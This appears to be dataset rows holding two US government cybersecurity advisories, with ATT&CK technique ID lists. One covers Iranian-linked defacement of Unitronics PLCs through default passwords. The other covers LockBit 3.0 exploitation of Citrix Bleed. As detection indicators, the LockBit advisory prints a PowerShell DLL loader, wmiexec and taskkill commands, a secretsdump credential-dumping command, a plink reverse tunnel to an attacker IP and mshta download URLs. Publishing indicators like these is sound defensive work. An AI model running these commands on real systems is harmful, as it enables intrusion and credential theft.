Do not ship products with default passwords. Instead, either ship products with random initial passwords or require users to change the password upon first use.
Do not expose administrative interfaces to the internet by default, and take steps to introduce friction should a device be placed in an insecure state.
Do not charge extra for basic security features needed to operate the product securely.
Support multifactor authentication, including via phishing-resistant methods.

By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates.
For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

EPA: Cybersecurity for the Water Sector
CISA: Water and Wastewater Systems Sector
CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems
CISA: Iran Cyber Threat Overview and Advisories
FBI: The Iran Threat - Web Page
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software
CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity
CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
CISA: Secure by Design and Default

REPORTING
All organizations should report suspicious or criminal activity related to information in this CSA to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Additionally, the WaterISAC encourages members to share information by emailing analyst@waterisac.org, calling 866-H2O-ISAC, or using the online incident reporting form. State, local, tribal, and territorial governments should report incidents to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
REFERENCES

CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group
Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare
Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack
Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers
X: @CyberAveng3rs

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
VERSION HISTORY
December 1, 2023: Initial version.December 14, 2023: Added CVE, patch information, and IOC descriptions.






This product is provided subject to this Notification and this Privacy & Use policy.


",{'T1110'},"






Actions to take today to mitigate malicious activity:




Implement multifactor authentication.
Use strong, unique passwords.
Check PLCs for default passwords.







SUMMARY
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), Environmental Protection Agency (EPA), and the Israel National Cyber Directorate (INCD)—hereafter referred to as ""the authoring agencies""—are disseminating this joint Cybersecurity Advisory (CSA) to highlight continued malicious cyber activity against operational technology devices by Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated Advanced Persistent Threat (APT) cyber actors.
The IRGC is an Iranian military organization that the United States designated as a foreign terrorist organization in 2019. IRGC-affiliated cyber actors using the persona “CyberAv3ngers” are actively targeting and compromising Israeli-made Unitronics Vision Series programmable logic controllers (PLCs). These PLCs are commonly used in the Water and Wastewater Systems (WWS) Sector and are additionally used in other industries including, but not limited to, energy, food and beverage manufacturing, and healthcare. The PLCs may be rebranded and appear as different manufacturers and companies. In addition to the recent CISA Alert, the authoring agencies are releasing this joint CSA to share indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with IRGC cyber operations.
Since at least November 22, 2023, these IRGC-affiliated cyber actors have continued to compromise default credentials in Unitronics devices. The IRGC-affiliated cyber actors left a defacement image stating, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is CyberAv3ngers legal target.” The victims span multiple U.S. states. The authoring agencies urge all organizations, especially critical infrastructure organizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from these IRGC-affiliated cyber actors.
This advisory provides observed IOCs and TTPs the authoring agencies assess are likely associated with this IRGC-affiliated APT. For more information on Iranian state-sponsored malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and the FBI’s Iran Threat webpage.
For a PDF version of this CSA, see: 


AA23-335A IRGC-Affiliated Cyber Actors Exploit PLCs in Multiple Sectors, Including U.S. Water and Wastewater Systems Facilities
(PDF,       594.03 KB
  )


For a downloadable copy of IOCs, see:


AA23-335A STIX XML
(XML,       15.50 KB
  )




AA23-335A STIX JSON
(JSON,       10.84 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See Table 1 for threat actor activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
CyberAv3ngers (also known as CyberAveng3rs, Cyber Avengers) is an Iranian IRGC cyber persona that has claimed responsibility for numerous attacks against critical infrastructure organizations.,1,2,3,4,5, The group claimed responsibility for cyberattacks in Israel beginning in 2020. CyberAv3ngers falsely claimed they compromised several critical infrastructure organizations in Israel.,2, CyberAv3ngers also reportedly has connections to another IRGC-linked group known as Soldiers of Solomon.
(Updated December 14, 2023) Most recently, CyberAv3ngers began targeting U.S.-based WWS facilities that operate Unitronics PLCs.,1, The threat actors compromised Unitronics Vision Series PLCs with human machine interfaces (HMI). These compromised devices were publicly exposed to the internet with default passwords and by default are on TCP port 20256. On December 11, 2023, CVE-2023-6448 was assigned to address the default passwords,CWE-798: Use of Hard Coded Credentials, and CISA added the CVE to its Known Exploited Vulnerabilities Catalog. On December 12, Unitronics released VisiLogic version 9.9.00 software to address this CVE; the update requires users to change default passwords.
These PLC and related controllers are often exposed to outside internet connectivity due to the remote nature of their control and monitoring functionalities. The compromise is centered around defacing the controller’s user interface and may render the PLC inoperative. With this type of access, deeper device and network level accesses are available and could render additional, more profound cyber physical effects on processes and equipment. It is not known if additional cyber activities deeper into these PLCs or related control networks and components were intended or achieved. Organizations should consider and evaluate their systems for these possibilities.
Threat Actor Activity
The authoring agencies have observed the IRGC-affiliated activity since at least October 2023, when the actors claimed credit for the cyberattacks against Israeli PLCs on their Telegram channel. Since November 2023, the authoring agencies have observed the IRGC-affiliated actors target multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs. Cyber threat actors likely compromised these PLCs since the PLCs were internet-facing and used Unitronics’ default password. Observed activity includes the following:

Between September 13 and October 30, 2023, the CyberAv3ngers Telegram channel displayed both legitimate and false claims of multiple cyberattacks against Israel. CyberAv3ngers targeted Israeli PLCs in the water, energy, shipping, and distribution sectors.
On October 18, 2023, the CyberAv3ngers-linked Soldiers of Solomon claimed responsibility for compromising over 50 servers, security cameras, and smart city management systems in Israel; however, majority of these claims were proven false. The group claimed to use a ransomware named “Crucio” against servers where the webcams camera software operated on port 7001.
Beginning on November 22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate Unitronics Vision Series PLCs with an HMI likely by compromising internet-accessible devices with default passwords. The targeted PLCs displayed the defacement message, “You have been hacked, down with Israel. Every equipment ‘made in Israel’ is Cyberav3ngers legal target.”

INDICATORS OF COMPROMISE
See Table 1 for observed IOCs related to CyberAv3nger operations.
(Updated December 14, 2023)

MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 2 for referenced threat actor tactics and techniques in this advisory.

MITIGATIONS
The authoring agencies recommend critical infrastructure organizations, including WWS sector facilities, implement the following mitigations to improve your organization’s cybersecurity posture to defend against CyberAv3ngers activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Note: The below mitigations are based on threat actor activity against Unitronics PLCs but apply to all internet-facing PLCs.
Network Defenders
The cyber threat actors likely accessed the affected devices—Unitronics Vision Series PLCs with HMI—by exploiting cybersecurity weaknesses, including poor password security and exposure to the internet. To safeguard against this threat, the authoring agencies urge organizations to consider the following:
Immediate steps to prevent attack:

(Updated December 14, 2023) Upgrade devices to 9.9.00 VisiLogic software, which requires users to change the default passwords on PLCs and HMIs. Use a strong password. For more information, see Unitronics’ blog Unitronics Cybersecurity for Vision and Samba PLC Series and Release notes for VisiLogic 9.9.00.
Disconnect the PLC from the public-facing internet.

Follow-on steps to strengthen your security posture:

Implement multifactor authentication for access to the operational technology (OT) network whenever applicable.
If you require remote access, implement a firewall and/or virtual private network (VPN) in front of the PLC to control network access. A VPN or gateway device can enable multifactor authentication for remote access even if the PLC does not support multifactor authentication.
Create strong backups of the logic and configurations of PLCs to enable fast recovery. Familiarize yourself with factory resets and backup deployment as preparation in the event of ransomware activity.
Keep your Unitronics and other PLC devices updated with the latest versions by the manufacturer.
Confirm third-party vendors are applying the above recommended countermeasures to mitigate exposure of these devices and all installed equipment.

In addition, the authoring agencies recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by cyber threat actors:

Reduce risk exposure. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. CISA Cyber Hygiene services can help provide additional review of organizations’ internet-accessible assets. Email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started.

Device Manufacturers
Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default. The authoring agencies urge device manufacturers to take ownership of the security outcomes of their customers by following the principles in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software, primarily:

Do not ship products with default passwords. Instead, either ship products with random initial passwords or require users to change the password upon first use.
Do not expose administrative interfaces to the internet by default, and take steps to introduce friction should a device be placed in an insecure state.
Do not charge extra for basic security features needed to operate the product securely.
Support multifactor authentication, including via phishing-resistant methods.

By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing tiered security software and logs, monitoring, and making routine updates.
For more information on common misconfigurations and guidance on reducing their prevalence, see joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

EPA: Cybersecurity for the Water Sector
CISA: Water and Wastewater Systems Sector
CISA Alert: Exploitation of Unitronics PLCs used in Water and Wastewater Systems
CISA: Iran Cyber Threat Overview and Advisories
FBI: The Iran Threat - Web Page
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Shifting the Balance of Cybersecurity Risk - Principles and Approaches for Secure by Design Software
CISA: Secure by Design Alert - How Software Manufacturers Can Shield Web Management Interfaces from Malicious Cyber Activity
CISA, NSA: NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
CISA: Secure by Design and Default

REPORTING
All organizations should report suspicious or criminal activity related to information in this CSA to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov. For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Additionally, the WaterISAC encourages members to share information by emailing analyst@waterisac.org, calling 866-H2O-ISAC, or using the online incident reporting form. State, local, tribal, and territorial governments should report incidents to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
REFERENCES

CBS News: Municipal Water Authority of Aliquippa hacked by Iranian-backed cyber group
Industrial Cyber: Digital Battlegrounds - Evolving Hybrid Kinetic Warfare
Bleeping Computer: Israel's Largest Oil Refinery Website Offline After DDoS Attack
Dark Reading: Website of Israeli Oil Refinery Taken Offline by Pro-Iranian Attackers
X: @CyberAveng3rs

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
VERSION HISTORY
December 1, 2023: Initial version.December 14, 2023: Added CVE, patch information, and IOC descriptions.






This product is provided subject to this Notification and this Privacy & Use policy.


","['T1036', 'T1529', 'T1195', 'T1495', 'T1078', 'T1584', 'T1531', 'T1587', 'T1565']","{'T1589', 'T1584.001', 'T1495', 'T1018', 'T1212', 'T1111', 'T1036.005', 'T1598.001', 'T1110.001', 'T1491.001', 'T1599', 'T1598', 'T1562.002', 'T1078.001', 'T1597.001', 'T1530', 'T1195', 'T1098.005', 'T1190', 'T1078', 'T1584.008', 'T1486', 'T1562.004'}","{'T1588.002', 'T1589', 'T1584.001', 'T1018', 'T1212', 'T1111', 'T1595.002', 'T1016', 'T1082', 'T1110.001', 'T1585.002', 'T1490', 'T1491.001', 'T1200', 'T1562.001', 'T1601.002', 'T1036', 'T1598', 'T0855', 'T1562.002', 'T1562.004', 'T1480.001', 'T1078.001', 'T1597.001', 'T1530', 'T1195', 'T1098.005', 'T1190', 'T1201', 'T1078', 'T1584.008', 'T1486', 'T1590.004', 'T1585', 'T1518.001'}","{'T1589', 'T1111', 'T1563', 'T0831', 'T1078, T1190', 'T0867', 'T0833', 'T0832', 'T0869', 'T1499', 'T0887', 'T1203', 'T1078, T1210', 'T1589, T1583', 'T1589, T1583, T1566', 'T0830', 'T1583, T1587, T1588', 'T1565', 'T1491', 'T0838', 'T1556', 'T1078', 'T0010, T0020, T0040', 'T1486', 'T1562', 'T0826'}"
12,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a,"



SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing & Analysis Center (MS-ISAC), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA) to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery control (ADC) and NetScaler Gateway appliances.
This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing. Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing Distribution Inc., its parts and distribution business that maintains a separate environment. Other trusted third parties have observed similar activity impacting their organization.
Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes across multiple critical infrastructure sectors, including education, energy, financial services, food and agriculture, government and emergency services, healthcare, manufacturing, and transportation. Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs.
Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password requirements and multifactor authentication (MFA), leading to successful session hijacking of legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated permissions to harvest credentials, move laterally, and access data and resources.
CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the Citrix Knowledge Center.
The authoring organizations encourage network defenders to hunt for malicious activity on their networks using the detection methods and IOCs within this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. If no compromise is detected, organizations should immediately apply patches made publicly available.
For the associated Malware Analysis Report (MAR), see: MAR-10478915-1.v1 Citrix Bleed
Download the PDF version of this report:


AA23-325A LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability
(PDF,       631.83 KB
  )


For a downloadable copy of IOCs, see:


AA23-325A STIX XML
(XML,       29.22 KB
  )




AA23-325A STIX JSON
(JSON,       23.00 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
CVE-2023-4966
CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway appliances with exploitation activity identified as early as August 2023. This vulnerability provides threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA [T1556.006] and hijack legitimate user sessions [T1563].
After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within the NetScaler appliance without a username, password, or access to MFA tokens [T1539]. Affiliates acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a vulnerable appliance returning system memory information [T1082]. The information obtained through this exploit contains a valid NetScaler AAA session cookie.
Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their Citrix Security Bulletin, which issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely available public exploits and evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog. This critical vulnerability exploit impacts the following software versions [1]:

NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50
NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19
NetScaler ADC and NetScaler Gateway version 12.1 (EOL)
NetScaler ADC 13.1FIPS before 13.1-37.163
NetScaler ADC 12.1-FIPS before 12.1-55.300
NetScaler ADC 12.1-NDcPP before 12.1-55.300

Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread exploitation of the Citrix vulnerability in unpatched software services throughout both private and public networks.
Threat Actor Activity
Malware identified in this campaign is generated beginning with the execution of a PowerShell script (123.ps1) which concatenates two base64 strings together, converts them to bytes, and writes them to the designated file path.



$y = ""TVqQAAMA...<long base64 string>""$x = ""RyEHABFQ...<long base64 string>""$filePath = ""C:\Users\Public\adobelib.dll""$fileBytes = [System.Convert]::FromBase64String($y + $x)[System.IO.File]::WriteAllBytes($filePath, $fileBytes)



The resulting file (adobelib.dll) is then executed by the PowerShell script using rundll32.
rundll32 C:\Users\Public\adobelib.dll,main <104 hex char key>
The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key. Following execution, the DLL attempts to send a POST request to https://adobe-us-updatefiles[.]digital/index.php which resolves to IP addresses 172.67.129[.]176 and 104.21.1[.]180 as of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles[.]digital have the appearance of legitimacy, the file and domain have no association with legitimate Adobe software and no identified interaction with the software.
Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using the Windows native utility mshta.exe and other common software tools typically associated with ransomware incidents.
INDICATORS OF COMPROMISE (IOCS)
See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.
[Fidelity] Legend:

High = Indicator is unique or highly indicates LockBit in an environment.
Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.
Low = Indicates tools that are commonly used but were used by LockBit.

Low confidence indicators may not be related to ransomware.
Disclaimer: Some IP addresses in this CSA may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Table 1: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description




192.229.221[.]95
IP
Low
Mag.dll calls out to this IP address. Ties back to dns0.org. Should run this DLL in a sandbox, when possible, to confirm C2. IP is shared hosting.


123.ps1
PowerShell script
High
Creates and executes payload via script.


193.201.9[.]224
IP
High
FTP to Russian geolocated IP from compromised system.


62.233.50[.]25
IP
High

Russian geolocated IP from compromised system.
Hxxp://62.233.50[.]25/en-us/docs.html
Hxxp://62.233.50[.]25/en-us/test.html



51.91.79[.].17
IP
Med
Temp.sh IP.


Teamviewer
Tool (Remote Admin)
Low
 


70.37.82[.]20
IP
Low
IP was seen from a known compromised account reaching out to an Altera IP address. LockBit is known to leverage Altera, a remote admin tool, such as Anydesk, team viewer, etc.


185.17.40[.]178
IP
Low
Teamviewer C2, ties back to a polish service provider, Artnet Sp. Zo.o. Polish IP address.




Table 2: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description




185.229.191.41
Anydesk Usage
High
Anydesk C2.


81.19.135[.]219
IP
High

Russian geolocated IP hxxp://81.19.135[.]219/F8PtZ87fE8dJWqe.hta
Hxxp://81.19.135[.]219:443/q0X5wzEh6P7.hta



45.129.137[.]233
IP
Medium
Callouts from known compromised device beginning during the compromised window.


185.229.191[.]41
Anydesk Usage
High
Anydesk C2.


Plink.exe
Command interpreter
High
Plink (PuTTY Link) is a command-line connection tool, similar to UNIX SSH. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink can be used to automate SSH actions and for remote SSH tunneling on Windows.


AnyDeskMSI.exe
Remote admin tool
High
We do see that AnyDeskMSI.exe was installed as a service with “auto start” abilities for persistence. Config file from the image could be leveraged to find the ID and Connection IP, but we do not have that currently.


SRUtility.exe
Splashtop utility
 
9b6b722ba4a691a2fe21747cd5b8a2d18811a173413d4934949047e04e40b30a


Netscan exe
Network scanning software
High
498ba0afa5d3b390f852af66bd6e763945bf9b6bff2087015ed8612a18372155




Table 3: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description





Scheduled task:
\MEGA\MEGAcmd


Persistence
 

High
 



Scheduled task:
UpdateAdobeTask

Persistence
High
 


Mag.dll
Persistence
High
Identified as running within UpdateAdobeTask cc21c77e1ee7e916c9c48194fad083b2d4b2023df703e544ffb2d6a0bfc90a63.


123.ps1
Script
High
Creates rundll32 C:\Users\Public\adobelib.dll,main ed5d694d561c97b4d70efe934936286fe562addf7d6836f795b336d9791a5c44.


Adobelib.dll
Persistence
Low
C2 from adobelib.dll.


Adobe-us-updatefiles[.]digital
Tool Download
High
Used to download obfuscated toolsets.


172.67.129[.]176
Tool Download
High
IP of adobe-us-updatefiles[.]digital.


104.21.1[.]180
Tool Download
High
Adobe-us-updatefiles[.]digital.


cmd.exe /q /c cd 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c cd \ 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c query user 1> \\127.0.0.1\admin$\__1698617793[.]44 2>&1
Command
High
wmiexec.exe usage


cmd.exe /q /c taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe /im sqlwb.exe /im sqltob.exe /im sqlservr.exe /im sqlserver.exe /im sqlscan.exe /im sqlbrowser.exe /im sqlrep.exe /im sqlmangr.exe /im sqlexp3.exe /im sqlexp2.exe /im sqlex
Command
High
wmiexec.exe usage


cmd.exe /q /c cd \ 1> \\127.0.0.1\admin$\__1698618133[.]54 2>&1
Command
High
wmiexec.exe usage



The authoring organizations recommended monitoring/reviewing traffic to the 81.19.135[.]* class C network and review for MSHTA being called with HTTP arguments [2].

Table 4: LockBit 3.0 Affiliate Citrix Bleed Campaign


Indicator
Type
Fidelity
Description
Notes




81.19.135[.]219
IP
High
Russian geolocated IP used by user to request mshta with http arguments to download random named HTA file named q0X5wzzEh6P7.hta
 


81.19.135[.]220
IP
High
Russian geolocated IP, seen outbound in logs
IP registered to a South African Company


81.19.135[.]226
IP
High
Russian geolocated IP, seen outbound in logs
IP registered to a South African Company




Table 5: Citrix Bleed Indicators of Compromise (IOCs)


Type
Indicator
Description




Filename
c:\users\<username>\downloads\process hacker 2\peview.exe
Process hacker


Filename
c:\users\<username>\music\process hacker 2\processhacker.exe
Process hacker


Filename
psexesvc.exe
Psexec service excutable


Filename
c:\perflogs\processhacker.exe
Process hacker


Filename
c:\windows\temp\screenconnect\23.8.5.8707\files\processhacker.exe
Process hacker transferred via screenconnect


Filename
c:\perflogs\lsass.dmp
Lsass dump


Filename
c:\users\<username>\downloads\mimikatz.exe
Mimikatz


Filename
c:\users\<username>\desktop\proc64\proc.exe
Procdump


Filename
c:\users\<username>\documents\veeam-get-creds.ps1
Decrypt veeam creds


Filename
secretsdump.py
Impacket installed on azure vm


Cmdline
secretsdump.py <domain>/<username>@<ip> -outputfile 1
Impacket installed on azure vm


Filename
ad.ps1
Adrecon found in powershell transcripts


Filename
c:\perflogs\64-bit\netscan.exe
Softperfect netscan


Filename
tniwinagent.exe
Total network inventory agent


Filename
psexec.exe
Psexec used to deploy screenconnect


Filename
7z.exe
Used to compress files


Tool
Action1
RMM


Tool
Atera
RMM


tool
anydesk
rmm


tool
fixme it
rmm


tool
screenconnect
rmm


tool
splashtop
rmm


tool
zoho assist
rmm


ipv4
101.97.36[.]61
zoho assist


ipv4
168.100.9[.]137
ssh portforwarding infra


ipv4
185.20.209[.]127
zoho assist


ipv4
185.230.212[.]83
zoho assist


ipv4
206.188.197[.]22
powershell reverse shell seen in powershell logging


ipv4
54.84.248[.]205
fixme ip


Ipv4
141.98.9[.]137
Remote IP for CitrixBleed


domain
assist.zoho.eu
zoho assist


filename
c:\perflogs\1.exe
connectwise renamed


filename
c:\perflogs\run.exe
screenconnect pushed by psexec


filename
c:\perflogs\64-bit\m.exe
connectwise renamed


filename
c:\perflogs\64-bit\m0.exe
connectwise renamed


filename
c:\perflogs\za_access_my_department.exe
zoho remote assist


filename
c:\users\<username>\music\za_access_my_department.exe
zoho remote assist


filename
c:\windows\servicehost.exe
plink renamed


filename
c:\windows\sysconf.bat
runs servicehost.exe (plink) command


filename
c:\windows\temp\screenconnect\23.8.5.8707\files\azure.msi
zoho remote assist used to transfer data via screenconnect


cmdline
echo enter | c:\windows\servicehost.exe -ssh -r 8085:127.0.0.1:8085 <username>@168.100.9[.]137 -pw <password>
plink port forwarding


domain
eu1-dms.zoho[.]eu
zoho assist


domain
fixme[.]it
fixme it


domain
unattended.techinline[.]net
fixme it



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.

Table 6: ATT&CK Techniques for Enterprise: Discovery


Technique Title
ID
Use




System Information Discovery
T1082
Threat actors will attempt to obtain information about the operating system and hardware, including versions, and patches.




Table 7: ATT&CK Techniques for Enterprise: Credential Access


Technique Title
ID
Use




Modify Authentication Process: Multifactor Authentication
T1556.006
Threat actors leverage vulnerabilities found within CVE- to compromise, modify, and/or bypass multifactor authentication to hijack user sessions, harvest credentials, and move laterally, which enables persistent access.


Steal Web Session Cookie
T1539
Threat actors with access to valid cookies can establish an authenticated session within the NetScaler appliance without a username, password, or access to multifactor authentication (MFA) tokens.



DETECTION METHODS
Hunting Guidance
Network defenders should prioritize observing users in session when hunting for network anomalies. This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ), new account creation, log item failure, or running commands such as hostname, quser, whoami, net, and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable NetScaler ADC or Gateway appliance can also aid in detection.
For IP addresses:

Identify if NetScaler logs the change in IP.
Identify if users are logging in from geolocations uncommon for your organization’s user base.
If logging VPN authentication, identify if users are associated with two or more public IP addresses while in a different subnet or geographically dispersed.

Note: MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by providing a token/session for an already authenticated user.
The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0 activity:

Search for filenames that contain tf0gYx2YI for identifying LockBit encrypted files.
LockBit 3.0 actors were seen using the C:\Temp directory for loading and the execution of files.
Investigate requests to the HTTP/S endpoint from WAF.
Hunt for suspicious login patterns from NetScaler logs
Hunt for suspicious virtual desktop agent Windows Registry keys
Analyze memory core dump files.

